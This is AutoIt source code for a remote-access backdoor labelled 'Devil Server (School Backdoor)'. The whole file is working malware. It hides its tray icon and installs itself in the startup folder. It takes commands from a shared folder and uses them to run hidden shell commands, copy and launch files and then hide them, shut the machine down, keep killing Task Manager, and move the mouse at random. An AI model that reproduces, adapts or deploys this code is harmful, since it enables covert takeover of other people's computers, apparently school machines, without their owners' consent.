#cs ----------------------------------------------------------------------------
 
 Devil Server ( School Backdoor )
 AutoIt Version: 3.3.14.2
 Version: Release ( 19:45 12.09.2017)

#ce ----------------------------------------------------------------------------

#NoTrayIcon
#include <Misc.au3>
#include <WinAPIFiles.au3>
#include <FileConstants.au3>
#include <MsgBoxConstants.au3>

; The program will not start twice
_Singleton("devil_check_server", 0)

; Read config file
Global $Config_ClientID = IniRead("config.ini", "Config", "ClientID", "defective_client")
Global $Config_ServerPatch = IniRead("config.ini", "Config", "ServerPatch", "C:\")
Global $Config_ControlPanelPatch = IniRead("config.ini", "Config", "ControlPanelPatch", "Devil-ControlPanel.exe")
Global $Config_AddToStartup = IniRead("config.ini", "Config", "AddToStartup", "False")
Global $Config_Speed = IniRead("config.ini", "Config", "Speed", "10")

; Variables
Global $ServerData = ""
Global $Status_CrazyMouse = "False"
Global $Status_BlockTaskManager = "False"

; Hotkey to start Control Panel
HotKeySet("{PAUSE}", "RunControlPanel")

; ------------------------------------------------------------------------------

; Add backdoor to start-up
If $Config_AddToStartup = "True" Then
	If Not FileExists(@StartupDir & "\devil_server.lnk") Then
		FileCreateShortcut(@ScriptFullPath, @StartupDir & "\devil_server.lnk", @ScriptDir, "", "devil_server")
	EndIf

	If FileExists(@StartupDir & "\devil_server.lnk") Then
		IniWrite("config.ini", "Config", "AddToStartup", "False")
		MsgBox($MB_OK, "Devil Server", "Devil Server added to start-up!")
	Else
		MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
	EndIf
EndIf
; ------------------------------------------------------------------------------

; Loop
While True
	Sleep($Config_Speed)
	$ServerData = ReadServer()

	; Definition and execution of the received command
	If $ServerData[0] = "execute_command" Then
		CMDExecute($ServerData[1])
	ElseIf $ServerData[0] = "show_message" Then
		ShowMessageBox($ServerData[1])
	ElseIf $ServerData[0] = "load_file" Then
		LoadFile($ServerData[1])
	ElseIf $ServerData[0] = "shutdown" Then
		SystemShutdown()
	ElseIf $ServerData[0] = "block_task_manager" Then
		$Status_BlockTaskManager = $ServerData[1]
	ElseIf $ServerData[0] = "crazy_mouse" Then
		$Status_CrazyMouse = $ServerData[1]
	EndIf

	; Same for crazy mouse and task manager blocker
	If $Status_BlockTaskManager = "True" Then
		BlockTaskManager()
	EndIf
	If $Status_CrazyMouse = "True" Then
		CrazyMouse()
	EndIf
WEnd

; ------------------------------------------------------------------------------

; Get data from the shared folder
Func ReadServer()

	; Read data from server
	If FileExists($Config_ServerPatch & "\" & $Config_ClientID) Then
		Local $Data[2]
		$Data[0] = IniRead($Config_ServerPatch & "\" & $Config_ClientID, "Data", "Type", "")
		$Data[1] = IniRead($Config_ServerPatch & "\" & $Config_ClientID, "Data", "Command", "")
		FileDelete($Config_ServerPatch & "\" & $Config_ClientID)
		Return $Data
	Else
		; So that the code does not produce errors
		Local $Data = ["", ""]
		Return $Data
	EndIf

EndFunc

; Upload and run file
Func LoadFile($File_name)
	Sleep($Config_Speed + 500) ; Some delay for file loading
	FileCopy($Config_ServerPatch & "\" & $File_name, @ScriptDir, 1)
	FileDelete($Config_ServerPatch & "\" & $File_name)
	ShellExecute($File_name) ; Launch the file
	FileSetAttrib($File_name, "+H") ; Hide the file!
EndFunc

; Execute to CMD
Func CMDExecute($Command)
	Run(@ComSpec & " /c " & $Command, "", @SW_HIDE)
EndFunc

; Show message
Func ShowMessageBox($Text)
	MsgBox($MB_OK, "Message", $Text, 10)
EndFunc

; Shutdown system
Func SystemShutdown()
	Shutdown($SD_SHUTDOWN)
EndFunc

; Block task manager
Func BlockTaskManager()
	If ProcessExists("taskmgr.exe") Then ProcessClose("taskmgr.exe")
EndFunc

; Сrazy mouse
Func CrazyMouse()
	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 3) ; Move mouse to random position
EndFunc

; Run Control Panel using hotkeys
Func RunControlPanel()
	Run($Config_ControlPanelPatch)
EndFunc